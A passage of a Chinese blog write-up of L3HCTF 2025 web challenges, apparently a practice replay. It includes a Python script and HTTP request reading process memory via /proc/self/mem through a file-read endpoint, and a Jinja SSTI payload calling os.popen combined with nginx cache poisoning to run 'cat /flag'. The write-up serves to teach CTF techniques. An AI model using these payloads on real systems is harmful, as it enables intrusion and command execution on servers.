class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 配置区 ---</span></span><br><span class="line">URL = <span class="string">&quot;http://1.95.8.146:17794/read_anywhere&quot;</span></span><br><span class="line">PASSWORD = <span class="string">&quot;passwordismemeispasswordsoneverwannagiveyouup&quot;</span></span><br><span class="line">FLAG_PREFIX = <span class="string">b&quot;L3HCTF&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从题目中获取的内存映射 (maps)</span></span><br><span class="line">maps_data = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">55c2a3295000-55c2a32d9000 r--p 00000000 00:38 672253                     /usr/local/openresty/nginx/sbin/nginx</span></span><br><span class="line"><span class="string">55c2a32d9000-55c2a3451000 r-xp 00044000 00:38 672253                     /usr/local/openresty/nginx/sbin/nginx</span></span><br><span class="line"><span class="string">55c2a3451000-55c2a34b9000 r--p 001bc000 00:38 672253                     /usr/local/openresty/nginx/sbin/nginx</span></span><br><span class="line"><span class="string">55c2a34b9000-55c2a34bc000 r--p 00224000 00:38 672253                     /usr/local/openresty/nginx/sbin/nginx</span></span><br><span class="line"><span class="string">55c2a34bc000-55c2a34e1000 rw-p 00227000 00:38 672253                     /usr/local/openresty/nginx/sbin/nginx</span></span><br><span class="line"><span class="string">55c2a34e1000-55c2a35b2000 rw-p 00000000 00:00 0 </span></span><br><span class="line"><span class="string">55c2cf9bd000-55c2cf9be000 ---p 00000000 00:00 0                          [heap]</span></span><br><span class="line"><span class="string">55c2cf9be000-55c2cf9c3000 rw-p 00000000 00:00 0                          [heap]</span></span><br><span class="line"><span class="string">7f416f604000-7f416fa53000 rw-p 00000000 00:00 0 </span></span><br><span class="line"><span class="string">7f416fa53000-7f416fa54000 rw-s 00000000 00:01 5167                       /dev/zero (deleted)</span></span><br><span class="line"><span class="string">7f416fa54000-7f416fb6d000 rw-p 00000000 00:00 0 </span></span><br><span class="line"><span class="string">7f416fb74000-7f416fb76000 rw-p 00000000 00:00 0 </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_flag</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    遍历内存映射，读取可疑区域并搜索Flag。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 开始扫描进程内存以寻找Flag...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 解析maps数据，只获取可读写(rw-p)的区域</span></span><br><span class="line">    target_regions = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> maps_data.strip().split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;rw-p&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">            parts = line.split()</span><br><span class="line">            address_range = parts[<span class="number">0</span>]</span><br><span class="line">            start_hex, end_hex = address_range.split(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">            target_regions.append((start_hex, end_hex))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 发现目标内存区域: <span class="subst">&#123;address_range&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 准备HTTP请求头</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;X-Gateway-Password&#x27;</span>: PASSWORD,</span><br><span class="line">        <span class="string">&#x27;X-Gateway-Filename&#x27;</span>: <span class="string">&#x27;/proc/self/mem&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 遍历目标区域</span></span><br><span class="line">    <span class="keyword">for</span> start_hex, end_hex <span class="keyword">in</span> target_regions:</span><br><span class="line">        start_dec = <span class="built_in">int</span>(start_hex, <span class="number">16</span>)</span><br><span class="line">        end_dec = <span class="built_in">int</span>(end_hex, <span class="number">16</span>)</span><br><span class="line">        length = end_dec - start_dec</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n[*] 正在扫描区域 <span class="subst">&#123;start_hex&#125;</span>-<span class="subst">&#123;end_hex&#125;</span> (大小: <span class="subst">&#123;length&#125;</span> 字节)...&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Nginx配置中限制了单次读取最大1MB，所以我们需要分块读取</span></span><br><span class="line">        chunk_size = <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">        <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, length, chunk_size):</span><br><span class="line">            current_start = start_dec + offset</span><br><span class="line">            <span class="comment"># 计算当前块的长度，确保不超过区域边界</span></span><br><span class="line">            current_length = <span class="built_in">min</span>(chunk_size, length - offset)</span><br><span class="line"></span><br><span class="line">            headers[<span class="string">&#x27;X-Gateway-Start&#x27;</span>] = <span class="built_in">str</span>(current_start)</span><br><span class="line">            headers[<span class="string">&#x27;X-Gateway-Length&#x27;</span>] = <span class="built_in">str</span>(current_length)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = requests.get(URL, headers=headers, timeout=<span class="number">20</span>)</span><br><span class="line">                <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                    <span class="comment"># 在返回的二进制内容中搜索Flag前缀</span></span><br><span class="line">                    <span class="keyword">if</span> FLAG_PREFIX <span class="keyword">in</span> response.content:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">40</span>)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;🎉🎉🎉 找到Flag了！位于内存区域 <span class="subst">&#123;start_hex&#125;</span> 附近。&quot;</span>)</span><br><span class="line">                        </span><br><span class="line">                        <span class="comment"># 从返回内容中提取完整的Flag</span></span><br><span class="line">                        <span class="comment"># 使用正则表达式以防flag中有特殊字符</span></span><br><span class="line">                        <span class="keyword">match</span> = re.search(<span class="string">b&#x27;(L3HCTF\\&#123;.*?\\&#125;)&#x27;</span>, response.content)</span><br><span class="line">                        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                            flag = <span class="keyword">match</span>.group(<span class="number">0</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;🚩 FLAG: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">&quot;[!] 找到了前缀，但无法完整提取。原始数据如下：&quot;</span>)</span><br><span class="line">                            <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">40</span>)</span><br><span class="line">                        <span class="keyword">return</span> <span class="comment"># 找到后结束脚本</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="comment"># 打印一个点表示进度</span></span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;.&quot;</span>, end=<span class="string">&quot;&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[!] 服务器返回错误: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[!] 请求失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n\n[*] 所有可疑区域扫描完毕，未找到Flag。请检查配置或内存映射。&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    find_flag()</span><br></pre></td></tr></table></figure></div>
+<p><img src="https://pic1.imgdb.cn/item/6879f54a58cb8da5c8c27f32.png"><br>一种是本地起环境，在nginx配置文件后面加上一段</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LUA"><figure class="iseeu highlight /lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">init_by_lua_block &#123;</span><br><span class="line">        # 在最后加上一段</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">tostring</span>(flag))</span><br><span class="line">        <span class="keyword">local</span> ffi = <span class="built_in">require</span>(<span class="string">&quot;ffi&quot;</span>)</span><br><span class="line">        <span class="keyword">local</span> ptr = ffi.cast(<span class="string">&quot;const char*&quot;</span>, flag)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Address: &quot;</span>, <span class="built_in">tostring</span>(ptr))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>得到flag的内存位置</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/read_anywhere</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>Your_host</span><br><span class="line"><span class="attribute">X-Gateway-Password</span><span class="punctuation">: </span>test_password</span><br><span class="line"><span class="attribute">X-Gateway-Filename</span><span class="punctuation">: </span>/proc/self/mem</span><br><span class="line"><span class="attribute">X-Gateway-Start</span><span class="punctuation">: </span>0x7e07636f3000</span><br><span class="line"><span class="attribute">X-Gateway-Length</span><span class="punctuation">: </span>0x100000</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="best-profile"><a href="#best-profile" class="headerlink" title="best_profile"></a>best_profile</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def route_ip_detail(username):</span><br><span class="line">    res = requests.get(f<span class="string">&quot;http://127.0.0.1/get_last_ip/&#123;username&#125;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> res.status_code != <span class="number">200</span>:</span><br><span class="line">        return <span class="string">&quot;Get last ip failed.&quot;</span></span><br><span class="line">    last_ip = res.text</span><br><span class="line">    try:</span><br><span class="line">        ip = re.findall(<span class="string">r&quot;\d+\.\d+\.\d+\.\d+&quot;</span>, last_ip)</span><br><span class="line">        country = geoip2_reader.country(ip)</span><br><span class="line">    except (ValueError, TypeError):</span><br><span class="line">        country = <span class="string">&quot;Unknown&quot;</span></span><br><span class="line">    template = f<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;IP Detail&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;div&gt;&#123;last_ip&#125;&lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;Country:&#123;country&#125;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    return render_template_string(template)</span><br></pre></td></tr></table></figure></div>
+<p>在<code>/ip_detail/&lt;string:username&gt;</code>路由中存在ssti<br>首先要创建一个用户，并且要以特定后缀名结尾 后续用来web缓存投毒</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NGINX"><figure class="iseeu highlight /nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> <span class="regexp">~ .*\.(gif|jpg|jpeg|png|bmp|swf)$</span> &#123;</span><br><span class="line">            <span class="attribute">proxy_ignore_headers</span> Cache-Control Expires Vary Set-Cookie;</span><br><span class="line">            <span class="attribute">proxy_pass</span> http://127.0.0.1:5000;</span><br><span class="line">            <span class="attribute">proxy_cache</span> static;</span><br><span class="line">            <span class="attribute">proxy_cache_valid</span> <span class="number">200</span> <span class="number">302</span> <span class="number">30d</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="section">location</span> <span class="regexp">~ .*\.(js|css)?$</span> &#123;</span><br><span class="line">            <span class="attribute">proxy_ignore_headers</span> Cache-Control Expires Vary Set-Cookie;</span><br><span class="line">            <span class="attribute">proxy_pass</span> http://127.0.0.1:5000;</span><br><span class="line">            <span class="attribute">proxy_cache</span> static;</span><br><span class="line">            <span class="attribute">proxy_cache_valid</span> <span class="number">200</span> <span class="number">302</span> <span class="number">12h</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>
+<p>然后调用<code>&quot;/&lt;string:username&gt;&quot;</code> 接口来保存当前的IP地址。<br>服务器使用了Nginx作为反向代理，所以request.remote_addr这个值实际上是从X-Forwarded-For这个HTTP请求头中获取的<br>payload:</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HANDLEBARS"><figure class="iseeu highlight /handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123; <span class="name">cycler.__init__.__globals__.os.popen</span>(<span class="name">request.args.c</span>).read() &#125;&#125;</span></span><br></pre></td></tr></table></figure></div>
+<p>调用”&#x2F;get_last_ip&#x2F;<a href="string:username">string:username</a>“接口来缓存响应。当下次我们再调用这个接口时，我们不再需要Cookie（也就是session），因为响应已经被Nginx缓存了。<br>最后调用”&#x2F;ip_detail&#x2F;<a href="string:username">string:username</a>“接口来触发SSTI漏洞。</p>
+<p>&#x2F;ip_detail&#x2F;user.bmp?c&#x3D;cat%20&#x2F;flag</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>guayu-kakeru
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://guayu-kakeru.github.io/posts/60548.html" title="L3HCTF 2025部分复现">https://guayu-kakeru.github.io/posts/60548.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/web/" rel="tag"># web</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/6341.html" rel="prev" title="xyctf2025部分复盘">
+      <i class="fa fa-chevron-left"></i> xyctf2025部分复盘
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/1.html" rel="next" title="">
+       <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#misc"><span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%87%8F%E5%AD%90%E5%8F%8C%E7%94%9F%E5%BD%B1"><span class="nav-text">量子双生影</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Please-Sign-In"><span class="nav-text">Please Sign In</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PaperBack"><span class="nav-text">PaperBack</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#gateway-advance"><span class="nav-text">gateway_advance</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#best-profile"><span class="nav-text">best_profile</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
+  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">77</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/guayu-kakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayu-kakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+  <div class="links-of-recent-posts motion-element">
+    <div class="links-of-recent-posts-title">
+      <i class="fa fa-history fa-fw"></i>
+      最近文章
+    </div>
+    <ul class="links-of-recent-posts-list">
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/60109.html" title="posts&#x2F;60109.html">Vulnhub-Me and My Girlfriend</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/11248.html" title="posts&#x2F;11248.html">XXE漏洞学习笔记</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/19220.html" title="posts&#x2F;19220.html">xmu新生赛web wp</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/1.html" title="posts&#x2F;1.html"></a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/60548.html" title="posts&#x2F;60548.html">L3HCTF 2025部分复现</a>
+        </li>
+    </ul>
+  </div>
+      </div>
+
+      
+      
+        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
+          <div class="links-of-blogroll-title">
+            <i class="fa fa-history fa-" aria-hidden="true"></i>
+            
+          </div>
+          <ul class="links-of-blogroll-list">
+            
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+          </ul>
+        </div>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
